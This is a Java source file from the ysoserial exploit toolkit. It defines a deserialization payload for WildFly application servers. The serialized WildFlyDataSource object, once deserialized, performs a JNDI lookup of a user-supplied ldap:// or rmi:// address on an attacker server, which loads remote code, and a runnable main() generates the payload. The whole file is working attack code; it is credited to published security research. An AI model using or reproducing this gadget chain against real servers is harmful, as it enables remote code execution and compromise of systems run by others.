package ysoserial.payloads;

import org.jboss.as.connector.subsystems.datasources.WildFlyDataSource;


import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.PayloadRunner;

/**
 *
 * Gadget chain:
 *
 * org.jboss.as.connector.subsystems.datasources.WildFlyDataSource.readObject()
 * javax.naming.InitialContext.lookup()
 *
 *
 * Arguments: - (rmi,ldap)://<attacker_server>[:<attacker_port>]/<classname>
 *
 *
 * @author hugov
 *         https://www.synacktiv.com/publications/finding-gadgets-like-its-2022.html
 *
 */

// test fail
@PayloadTest(skip = "true")
@Dependencies({ "org.wildfly:wildfly-connector:30.0.1.Final"})
@Authors({ Authors.HUGOW })
public class WildFly implements ObjectPayload<Object> {

    public Object getObject ( String command ) throws Exception {

        // validate command
        if (!(command.startsWith("ldap://") || command.startsWith("rmi://")))
            throw new IllegalArgumentException(
                "Command format is: " + "(rmi,ldap)://<attacker_server>[:<attacker_port>]/<classname>");

        return new WildFlyDataSource(null, command);
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(WildFly.class, args);
    }

}
